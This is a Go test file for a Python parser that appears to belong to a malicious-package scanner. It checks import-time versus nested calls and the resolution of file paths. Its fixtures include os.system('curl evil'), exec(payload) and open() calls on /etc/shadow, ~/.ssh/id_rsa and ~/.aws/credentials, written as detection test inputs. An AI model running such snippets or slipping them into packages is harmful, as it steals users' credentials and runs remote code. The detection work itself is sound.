package python

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// callsOf flattens the parsed module into a comparable view: every
// call site as "dotted.name" plus whether it is at module scope
// (runs on import) or nested in a def/class body.
type callView struct {
	Callee      string
	ModuleScope bool
}

func parseCalls(t *testing.T, src string) []callView {
	t.Helper()
	mod, err := Parse([]byte(src))
	require.NoError(t, err)
	var out []callView
	for _, c := range mod.Calls {
		out = append(out, callView{Callee: c.Callee, ModuleScope: c.ModuleScope})
	}
	return out
}

func TestParse_ModuleScopeVsNestedCall(t *testing.T) {
	t.Parallel()
	// The core discriminator: os.system at module scope runs on
	// import (the PyPI attack shape); the same call inside a def does
	// not. The parser must distinguish them.
	src := "" +
		"import os\n" +
		"os.system('curl evil')\n" +
		"def safe():\n" +
		"    os.system('ok later')\n"
	got := parseCalls(t, src)
	assert.Equal(t, []callView{
		{Callee: "os.system", ModuleScope: true},
		{Callee: "os.system", ModuleScope: false},
	}, got)
}

func TestParse_BareAndDeeplyDottedCalls(t *testing.T) {
	t.Parallel()
	src := "" +
		"exec(payload)\n" +
		"a.b.c.d(1)\n"
	got := parseCalls(t, src)
	assert.Equal(t, []callView{
		{Callee: "exec", ModuleScope: true},
		{Callee: "a.b.c.d", ModuleScope: true},
	}, got)
}

func TestParse_CallInsideClassBodyIsNotModuleScope(t *testing.T) {
	t.Parallel()
	src := "" +
		"class C:\n" +
		"    base64.b64decode(x)\n"
	got := parseCalls(t, src)
	assert.Equal(t, []callView{
		{Callee: "base64.b64decode", ModuleScope: false},
	}, got)
}

func TestParse_StringArgIsNotACall(t *testing.T) {
	t.Parallel()
	// "exec(" living inside a string literal must not be parsed as a
	// call — the lexer makes strings opaque; assert end to end.
	src := "msg = 'call exec(1) please'\n"
	got := parseCalls(t, src)
	assert.Empty(t, got)
}

func TestParse_FirstArgStaticResolution(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		src  string
		want string // FirstArg of the first recorded call
	}{
		{"string literal", "open('/etc/passwd')\n", "/etc/passwd"},
		{"double quoted", "open(\"/etc/shadow\")\n", "/etc/shadow"},
		{"implicit concat", "open('a' 'b' 'c')\n", "abc"},
		{"raw/bytes prefix", "open(rb'/x/y')\n", "/x/y"},
		{"expanduser literal", "open(os.path.expanduser('~/.ssh/id_rsa'))\n", "~/.ssh/id_rsa"},
		{"path join literals", "open(os.path.join('a', 'b', 'c'))\n", "a/b/c"},
		{"nested join+expanduser",
			"open(os.path.join(os.path.expanduser('~'), '.aws', 'credentials'))\n",
			"~/.aws/credentials"},
		{"fstring interpolation unresolved", "open(f'{home}/.ssh/id_rsa')\n", ""},
		{"name unresolved", "open(path)\n", ""},
		{"call result unresolved", "open(get_path())\n", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			mod, err := Parse([]byte(tc.src))
			require.NoError(t, err)
			require.NotEmpty(t, mod.Calls, "expected a recorded call")
			assert.Equal(t, tc.want, mod.Calls[0].FirstArg)
		})
	}
}

func TestParse_Imports(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os\n" +
		"import os.path as p\n" +
		"from base64 import b64decode\n" +
		"from x import a, b as c\n"
	mod, err := Parse([]byte(src))
	require.NoError(t, err)
	assert.Equal(t, []string{"os", "os.path", "base64.b64decode", "x.a", "x.b"}, mod.Imports)
}
